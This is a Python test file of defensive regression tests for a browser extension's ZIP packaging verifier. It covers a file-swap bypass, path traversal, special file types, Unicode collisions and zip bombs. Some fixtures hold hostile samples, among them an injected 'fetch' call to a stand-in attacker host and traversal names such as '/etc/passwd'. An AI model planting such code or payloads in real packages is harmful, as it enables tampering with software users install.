#!/usr/bin/env python3
"""Adversarial regressions for exact extension ZIP custody.

These tests pin the independently reproduced pathname reopen-swap bypass and
the fail-closed archive hygiene that must hold before decompression.
"""
from __future__ import annotations

import builtins
import hashlib
import importlib.util
import io
import os
import shutil
import stat
import struct
import sys
import unicodedata
import warnings
import zipfile
import zlib
from pathlib import Path

import pytest

TOOLS = Path(__file__).resolve().parent
EXT = TOOLS.parent
ROOT = EXT.parent
sys.path.insert(0, str(TOOLS))

import checks  # noqa: E402
import assert_chrome_zip  # noqa: E402


def _load_builder():
    spec = importlib.util.spec_from_file_location(
        "extension_build_exact_zip_custody", EXT / "build.py"
    )
    assert spec is not None and spec.loader is not None
    builder = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(builder)
    return builder


BUILDER = _load_builder()
NON_FINITE_JSON_NUMBERS = ("NaN", "Infinity", "-Infinity")
VALID_TEST_CHROME_EXTENSION_ID = "a" * 32


def _install_valid_temporary_chrome_identity(repo: Path) -> Path:
    for relative in BUILDER._verifier_source_relatives():
        dest = repo.joinpath(*relative.split("/"))
        dest.parent.mkdir(parents=True, exist_ok=True)
        shutil.copyfile(ROOT.joinpath(*relative.split("/")), dest)
    chrome_template = (
        repo / "tools" / "native_messaging" / "manifests" / "org.winsvpn.bridge.chrome.json"
    )
    payload = chrome_template.read_bytes()
    current_host = assert_chrome_zip.jsonc.loads(payload.decode("utf-8"))
    current_id = checks.validated_chromium_allowed_origin(current_host, "chrome")
    current = current_id.encode("ascii")
    assert current != VALID_TEST_CHROME_EXTENSION_ID.encode("ascii")
    assert payload.count(current) == 1
    chrome_template.write_bytes(
        payload.replace(current, VALID_TEST_CHROME_EXTENSION_ID.encode("ascii"))
    )
    return chrome_template


def _zip_bytes(
    members: list[tuple[str, str | bytes]],
    *,
    compress: int = zipfile.ZIP_DEFLATED,
    unix_type: int = 0,
    extra: bytes = b"",
    comment: bytes = b"",
) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as archive:
        archive.comment = comment
        for name, body in members:
            data = body.encode("utf-8") if isinstance(body, str) else body
            info = zipfile.ZipInfo(name)
            info.create_system = 3
            info.compress_type = compress
            info.external_attr = (unix_type | 0o644) << 16
            if extra:
                info.extra = extra
            archive.writestr(info, data)
    return buf.getvalue()


def _extract(tmp_path: Path, payload: bytes, name: str = "out"):
    destination = tmp_path / name
    return BUILDER.extract_existing_zip(payload, destination), destination


def _append_member(payload: bytes, name: str, body: str | bytes) -> bytes:
    data = body.encode("utf-8") if isinstance(body, str) else body
    source = io.BytesIO(payload)
    output = io.BytesIO()
    with zipfile.ZipFile(source, "r") as reader, zipfile.ZipFile(output, "w") as writer:
        for info in reader.infolist():
            writer.writestr(info, reader.read(info))
        writer.writestr(name, data)
    return output.getvalue()


def _replace_member(payload: bytes, name: str, body: str | bytes) -> bytes:
    data = body.encode("utf-8") if isinstance(body, str) else body
    source = io.BytesIO(payload)
    output = io.BytesIO()
    replaced = False
    with zipfile.ZipFile(source, "r") as reader, zipfile.ZipFile(output, "w") as writer:
        for info in reader.infolist():
            member = data if info.filename == name else reader.read(info)
            replaced |= info.filename == name
            writer.writestr(info, member)
    assert replaced
    return output.getvalue()


@pytest.fixture(scope="module")
def honest_chrome_zip(tmp_path_factory: pytest.TempPathFactory) -> bytes:
    root = tmp_path_factory.mktemp("honest-chrome")
    builder = _load_builder()
    builder.DIST = root / "dist"
    archive = builder.zip_package(builder.stage("chrome"), "chrome")
    return archive.read_bytes()


def test_extract_refuses_pathname_reopen(tmp_path: Path):
    archive = tmp_path / "wins-vpn-companion-chrome.zip"
    archive.write_bytes(_zip_bytes([("manifest.json", "{}")]))
    with pytest.raises(BUILDER.PackageVerifyError, match="byte snapshot"):
        BUILDER.extract_existing_zip(archive, tmp_path / "out")


def test_p0_pathname_reopen_swap_cannot_attest_unsafe_bytes(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, honest_chrome_zip: bytes
):
    clean = honest_chrome_zip
    unsafe = _append_member(
        clean, "src/core/probe.js", "await fetch('https://evil.test');\n"
    )
    unsafe_digest = hashlib.sha256(unsafe).hexdigest()
    artifact = tmp_path / "wins-vpn-companion-chrome.zip"
    artifact.write_bytes(unsafe)
    artifact_abs = os.path.abspath(artifact)
    opens = {"count": 0}
    zip_files: list[object] = []

    real_os_open = os.open
    real_builtin_open = builtins.open
    real_zipfile = BUILDER.zipfile.ZipFile

    def _is_artifact(path_obj: object) -> bool:
        try:
            return os.path.abspath(os.fspath(path_obj)) == artifact_abs
        except TypeError:
            return False

    def _replace(data: bytes) -> None:
        fd = real_os_open(artifact_abs, os.O_WRONLY | os.O_TRUNC)
        try:
            view = memoryview(data)
            while view:
                written = os.write(fd, view)
                view = view[written:]
            os.fsync(fd)
        finally:
            os.close(fd)

    def swapping_os_open(path, flags, *args, **kwargs):
        if _is_artifact(path):
            opens["count"] += 1
            if opens["count"] >= 2:
                _replace(clean)
                try:
                    return real_os_open(path, flags, *args, **kwargs)
                finally:
                    _replace(unsafe)
        return real_os_open(path, flags, *args, **kwargs)

    def swapping_builtin_open(file, *args, **kwargs):
        if _is_artifact(file):
            opens["count"] += 1
            if opens["count"] >= 2:
                _replace(clean)
                try:
                    return real_builtin_open(file, *args, **kwargs)
                finally:
                    _replace(unsafe)
        return real_builtin_open(file, *args, **kwargs)

    class TrackingZipFile(real_zipfile):
        def __init__(self, file, *args, **kwargs):
            zip_files.append(file)
            super().__init__(file, *args, **kwargs)

    monkeypatch.setattr(os, "open", swapping_os_open)
    monkeypatch.setattr(builtins, "open", swapping_builtin_open)
    monkeypatch.setattr(BUILDER.zipfile, "ZipFile", TrackingZipFile)

    with pytest.raises(
        BUILDER.PackageVerifyError, match="leak or policy|extra members"
    ):
        BUILDER.verify_existing_package(artifact, "chrome", repo=ROOT, verbose=False)

    assert hashlib.sha256(artifact.read_bytes()).hexdigest() == unsafe_digest
    assert zip_files
    for handle in zip_files:
        assert not _is_artifact(handle)


def test_reported_hash_is_bound_to_snapshot_not_later_path(
    tmp_path: Path, honest_chrome_zip: bytes
):
    repo = tmp_path / "repo"
    _install_valid_temporary_chrome_identity(repo)
    artifact = tmp_path / "wins-vpn-companion-chrome.zip"
    artifact.write_bytes(honest_chrome_zip)
    payload, digest = BUILDER.snapshot_extension_artifact(artifact)
    assert digest == hashlib.sha256(honest_chrome_zip).hexdigest()
    assert payload == honest_chrome_zip
    artifact.write_bytes(b"swapped-after-snapshot")
    members, destination = _extract(tmp_path, payload, "bound")
    assert "manifest.json" in members
    assert (destination / "manifest.json").is_file()
    artifact.write_bytes(honest_chrome_zip)
    verified = BUILDER.verify_existing_package(artifact, "chrome", repo=repo, verbose=False)
    assert verified["ok"] is True
    assert verified["sha256"] == hashlib.sha256(honest_chrome_zip).hexdigest()
    assert verified["bytes"] == len(honest_chrome_zip)
    artifact.write_bytes(b"not-the-attested-bytes")
    assert verified["sha256"] != hashlib.sha256(artifact.read_bytes()).hexdigest()


@pytest.mark.parametrize("constant", NON_FINITE_JSON_NUMBERS)
def test_exact_zip_verifier_rejects_non_finite_manifest_number(
    tmp_path: Path, honest_chrome_zip: bytes, constant: str
):
    with zipfile.ZipFile(io.BytesIO(honest_chrome_zip)) as archive:
        manifest = archive.read("manifest.json").decode("utf-8")
    hostile_manifest = manifest.replace(
        '"manifest_version": 3',
        f'"manifest_version": {constant}',
        1,
    )
    artifact = tmp_path / "wins-vpn-companion-chrome.zip"
    artifact.write_bytes(
        _replace_member(honest_chrome_zip, "manifest.json", hostile_manifest)
    )

    with pytest.raises(BUILDER.PackageVerifyError, match="leak or policy"):
        BUILDER.verify_existing_package(
            artifact,
            "chrome",
            repo=ROOT,
            verbose=False,
        )


@pytest.mark.parametrize("constant", NON_FINITE_JSON_NUMBERS)
def test_direct_chromium_zip_gate_rejects_non_finite_manifest_number(
    honest_chrome_zip: bytes, constant: str
):
    with zipfile.ZipFile(io.BytesIO(honest_chrome_zip)) as archive:
        manifest = archive.read("manifest.json").decode("utf-8")
    hostile_manifest = manifest.replace(
        '"manifest_version": 3',
        f'"manifest_version": {constant}',
        1,
    )
    assert hostile_manifest != manifest

    result = assert_chrome_zip.inspect_bytes(
        _replace_member(honest_chrome_zip, "manifest.json", hostile_manifest),
        "chrome",
    )

    assert result["ok"] is False
    assert any(
        f"invalid JSON number: {constant}" in failure
        for failure in result["failures"]
    )


def test_extract_rejects_extra_source_map_and_native_host_members(tmp_path: Path):
    mapped = _zip_bytes(
        [("manifest.json", "{}"), ("src/core/copy.js.map", '{"version":3}\n')]
    )
    with pytest.raises(BUILDER.PackageVerifyError, match="secret-bearing|native-host"):
        _extract(tmp_path, mapped, "map")

    native = _zip_bytes(
        [
            ("manifest.json", "{}"),
            ("native_messaging/org.winsvpn.bridge.json", "{}\n"),
        ]
    )
    with pytest.raises(BUILDER.PackageVerifyError, match="secret-bearing|native-host"):
        _extract(tmp_path, native, "host")


def test_snapshot_rejects_symlink_hardlink_and_nonregular(tmp_path: Path):
    payload = _zip_bytes([("manifest.json", "{}")])
    regular = tmp_path / "regular.zip"
    regular.write_bytes(payload)
    linked = tmp_path / "wins-vpn-companion-chrome.zip"
    linked.symlink_to(regular)
    with pytest.raises(BUILDER.PackageVerifyError, match="symbolic link"):
        BUILDER.snapshot_extension_artifact(linked)

    hard = tmp_path / "hard.zip"
    try:
        os.link(regular, hard)
    except OSError as exc:
        pytest.skip(f"hard links unavailable: {exc}")
    with pytest.raises(BUILDER.PackageVerifyError, match="hard link"):
        BUILDER.snapshot_extension_artifact(hard)

    directory = tmp_path / "dir.zip"
    directory.mkdir()
    with pytest.raises(BUILDER.PackageVerifyError, match="regular file"):
        BUILDER.snapshot_extension_artifact(directory)


@pytest.mark.parametrize(
    ("unix_type", "match"),
    [
        (stat.S_IFLNK, "symbolic link"),
        (stat.S_IFIFO, "FIFO"),
        (stat.S_IFCHR, "device"),
        (stat.S_IFBLK, "device"),
        (stat.S_IFSOCK, "socket"),
    ],
)
def test_extract_rejects_unix_special_types(tmp_path: Path, unix_type: int, match: str):
    payload = _zip_bytes(
        [("manifest.json", "{}"), ("src/special.js", "export {};\n")],
        unix_type=unix_type,
    )
    with pytest.raises(BUILDER.PackageVerifyError, match=match):
        _extract(tmp_path, payload)


def test_extract_allows_store_and_deflate(tmp_path: Path):
    stored = _zip_bytes(
        [("manifest.json", "{}"), ("src/a.js", "export {};\n")],
        compress=zipfile.ZIP_STORED,
    )
    deflated = _zip_bytes(
        [("manifest.json", "{}"), ("src/b.js", "export {};\n")],
        compress=zipfile.ZIP_DEFLATED,
    )
    stored_members, _ = _extract(tmp_path, stored, "stored")
    deflated_members, _ = _extract(tmp_path, deflated, "deflated")
    assert "src/a.js" in stored_members
    assert "src/b.js" in deflated_members


def test_extract_rejects_unsupported_compression_method(tmp_path: Path):
    pytest.importorskip("bz2")
    payload = _zip_bytes(
        [("manifest.json", "{}"), ("src/a.js", "export {};\n")],
        compress=zipfile.ZIP_BZIP2,
    )
    with pytest.raises(BUILDER.PackageVerifyError, match="compression method"):
        _extract(tmp_path, payload)


@pytest.mark.parametrize(
    "name",
    [
        "../escape.js",
        "/etc/passwd",
        "C:/Windows/System32/drivers/etc/hosts",
        r"src\backslash.js",
        "./ambiguous.js",
        "src/../escape.js",
        "src//dup.js",
    ],
)
def test_extract_rejects_unsafe_member_paths(tmp_path: Path, name: str):
    payload = _zip_bytes([("manifest.json", "{}"), (name, "x")])
    with pytest.raises(
        BUILDER.PackageVerifyError,
        match="ambiguous|unsafe|backslash",
    ):
        _extract(tmp_path, payload)


def test_extract_rejects_nfc_and_casefold_collisions(tmp_path: Path):
    nfd = "src/cafe" + "\u0301" + ".js"
    assert unicodedata.normalize("NFC", nfd) != nfd
    nfd_zip = _zip_bytes([("manifest.json", "{}"), (nfd, "export {};\n")])
    with pytest.raises(BUILDER.PackageVerifyError, match="non-NFC"):
        _extract(tmp_path, nfd_zip, "nfd")

    collision = _zip_bytes(
        [
            ("manifest.json", "{}"),
            ("src/Foo.js", "export {};\n"),
            ("src/foo.js", "export {};\n"),
        ]
    )
    with pytest.raises(BUILDER.PackageVerifyError, match="case-fold"):
        _extract(tmp_path, collision, "fold")


def test_extract_rejects_non_utf8_ambiguous_name(tmp_path: Path):
    cafe_name = "src/caf" + chr(0xE9) + ".js"
    payload = bytearray(
        _zip_bytes([("manifest.json", "{}"), (cafe_name, "export {};\n")])
    )
    offset = 0
    while True:
        local = payload.find(b"PK\x03\x04", offset)
        central = payload.find(b"PK\x01\x02", offset)
        hits = [pos for pos in (local, central) if pos >= 0]
        if not hits:
            break
        pos = min(hits)
        flag_at = pos + 6 if pos == local else pos + 8
        flags = int.from_bytes(payload[flag_at : flag_at + 2], "little")
        payload[flag_at : flag_at + 2] = (flags & ~0x800).to_bytes(2, "little")
        offset = pos + 4
    with pytest.raises(BUILDER.PackageVerifyError, match="non-UTF8|ambiguous"):
        _extract(tmp_path, bytes(payload))


def test_extract_rejects_unicode_path_extra_field(tmp_path: Path):
    name = b"manifest.json"
    extra = (
        struct.pack("<HHBL", 0x7075, 5 + len(name), 1, zlib.crc32(name) & 0xFFFFFFFF)
        + name
    )
    payload = _zip_bytes([("manifest.json", "{}")], extra=extra)
    with pytest.raises(BUILDER.PackageVerifyError, match="unicode path extra"):
        _extract(tmp_path, payload)


def test_extract_rejects_duplicate_normalized_paths(tmp_path: Path):
    buf = io.BytesIO()
    with warnings.catch_warnings():
        warnings.simplefilter("ignore", UserWarning)
        with zipfile.ZipFile(buf, "w") as archive:
            archive.writestr("manifest.json", b"{}")
            archive.writestr("manifest.json", b"{}\n")
    with pytest.raises(BUILDER.PackageVerifyError, match="duplicate"):
        _extract(tmp_path, buf.getvalue())


def test_extract_rejects_zip_comment(tmp_path: Path):
    payload = _zip_bytes([("manifest.json", "{}")], comment=b"trailer")
    with pytest.raises(BUILDER.PackageVerifyError, match="comment"):
        _extract(tmp_path, payload)


def test_limits_are_enforced_before_decompression(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
):
    monkeypatch.setattr(BUILDER, "MAX_ZIP_ARCHIVE_BYTES", 32)
    too_big = tmp_path / "big.zip"
    too_big.write_bytes(b"PK" + b"\x00" * 40)
    with pytest.raises(BUILDER.PackageVerifyError, match="archive size"):
        BUILDER.snapshot_extension_artifact(too_big)

    monkeypatch.setattr(BUILDER, "MAX_ZIP_ARCHIVE_BYTES", 8 * 1024 * 1024)
    monkeypatch.setattr(BUILDER, "MAX_ZIP_MEMBERS", 2)
    crowded = _zip_bytes(
        [("manifest.json", "{}"), ("a.js", "a"), ("b.js", "b")]
    )
    with pytest.raises(BUILDER.PackageVerifyError, match="member count"):
        _extract(tmp_path, crowded, "count")

    monkeypatch.setattr(BUILDER, "MAX_ZIP_MEMBERS", 512)
    monkeypatch.setattr(BUILDER, "MAX_ZIP_MEMBER_BYTES", 8)
    oversized = _zip_bytes([("manifest.json", "{}"), ("src/a.js", "0123456789")])
    with pytest.raises(BUILDER.PackageVerifyError, match="size limit"):
        _extract(tmp_path, oversized, "member")

    monkeypatch.setattr(BUILDER, "MAX_ZIP_MEMBER_BYTES", 2 * 1024 * 1024)
    monkeypatch.setattr(BUILDER, "MAX_ZIP_TOTAL_BYTES", 20)
    total = _zip_bytes(
        [("manifest.json", "12345678901"), ("src/a.js", "12345678901")]
    )
    with pytest.raises(BUILDER.PackageVerifyError, match="expanded size"):
        _extract(tmp_path, total, "total")

    monkeypatch.setattr(BUILDER, "MAX_ZIP_TOTAL_BYTES", 8 * 1024 * 1024)
    monkeypatch.setattr(BUILDER, "MAX_ZIP_RATIO", 2)
    bomb = _zip_bytes([("manifest.json", "{}"), ("src/bomb.js", "a" * 4000)])
    with pytest.raises(BUILDER.PackageVerifyError, match="compression ratio"):
        _extract(tmp_path, bomb, "ratio")


def test_crc_mismatch_is_rejected_after_bounded_extract(tmp_path: Path):
    payload = bytearray(
        _zip_bytes(
            [("manifest.json", "{}"), ("src/a.js", "hello")],
            compress=zipfile.ZIP_STORED,
        )
    )
    index = payload.find(b"hello")
    assert index >= 0
    payload[index] ^= 0xFF
    with pytest.raises(BUILDER.PackageVerifyError, match="CRC|corrupt"):
        _extract(tmp_path, bytes(payload), "crc")


def test_native_host_identity_fail_closed_without_snapshot(tmp_path: Path):
    pkg = tmp_path / "pkg"
    (pkg / "src" / "adapters").mkdir(parents=True)
    (pkg / "src" / "background").mkdir(parents=True)
    (pkg / "src" / "core").mkdir(parents=True)
    (pkg / "src" / "adapters" / "base.js").write_text(
        "port = api.runtime.connectNative(hostName);\n", encoding="utf-8"
    )
    (pkg / "src" / "background" / "controller.js").write_text(
        "this.port = this.adapter.connectNative(NATIVE_HOST_NAME, {\n",
        encoding="utf-8",
    )
    (pkg / "src" / "core" / "constants.js").write_text(
        "export const NATIVE_HOST_NAME = 'org.winsvpn.bridge';\n", encoding="utf-8"
    )
    (pkg / "src" / "adapters" / "chromium.js").write_text(
        "export class ChromiumAdapter extends BaseAdapter {}\n", encoding="utf-8"
    )
    (pkg / "src" / "adapters" / "firefox.js").write_text(
        "export class FirefoxAdapter extends BaseAdapter {}\n", encoding="utf-8"
    )
    (pkg / "manifest.json").write_text("{}", encoding="utf-8")
    found = checks.check_native_messaging_wiring(
        pkg, "chrome", allow_live_template=False
    )
    assert any("authenticated template snapshot" in item.detail for item in found)
    run_found = checks.run(
        pkg,
        "chrome",
        pkg / "src" / "core" / "copy.js",
        require_authenticated_host_templates=True,
    )
    assert any("authenticated template snapshot" in item.detail for item in run_found)


def test_honest_zip_javascript_is_store_minified(honest_chrome_zip: bytes):
    sys.path.insert(0, str(TOOLS))
    import store_js_minifier as minifier

    js_members = 0
    with zipfile.ZipFile(io.BytesIO(honest_chrome_zip)) as archive:
        for name in archive.namelist():
            if not name.endswith(".js"):
                continue
            js_members += 1
            payload = archive.read(name)
            minifier.reject_packaged_javascript(name, payload.decode("utf-8"))
            assert b"sourceMappingURL" not in payload
            assert b"_0x" not in payload
    assert js_members > 0


def test_verify_consumes_template_snapshot_not_live_files(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, honest_chrome_zip: bytes
):
    repo = tmp_path / "repo"
    chrome_template = _install_valid_temporary_chrome_identity(repo)
    snapshot = chrome_template.read_bytes()
    artifact = tmp_path / "wins-vpn-companion-chrome.zip"
    artifact.write_bytes(honest_chrome_zip)
    captured: dict[str, object] = {}
    original_gate = BUILDER.gate

    def wrapped_gate(*args, **kwargs):
        captured.update(kwargs)
        chrome_template.write_bytes(b'{ "name": "mutated-after-closure" }\n')
        return original_gate(*args, **kwargs)

    monkeypatch.setattr(BUILDER, "gate", wrapped_gate)
    result = BUILDER.verify_existing_package(
        artifact, "chrome", repo=repo, verbose=False
    )
    assert result["ok"] is True
    assert captured.get("require_authenticated_host_templates") is True
    templates = captured.get("authenticated_host_templates")
    assert isinstance(templates, dict)
    assert templates["chrome"] == snapshot
    assert chrome_template.read_bytes() != snapshot


if __name__ == "__main__":
    raise SystemExit(pytest.main([__file__, "-q"]))
